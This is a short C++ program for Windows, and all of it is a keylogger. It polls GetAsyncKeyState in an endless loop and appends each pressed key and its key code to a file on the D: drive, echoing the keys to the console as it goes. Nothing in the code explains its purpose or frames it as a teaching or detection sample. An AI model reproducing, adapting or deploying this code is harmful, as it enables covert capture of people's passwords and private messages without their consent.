#include<iostream>
#include<windows.h>
#include<fstream>

using namespace std;

int main()
{
    fstream file;
    string txt;
    while(1)
    {
        for(int i = 0;i<255;i++)
        {
            if(GetAsyncKeyState(i)==-32767)
            {
                file.open("D:\\Keystrokes.txt",ios::app);
                cout<<(char)i<<endl;
                file<<(char)i<<"      KEYCODE: "<<i<<endl;
                file.close();
            }
        }
    }
}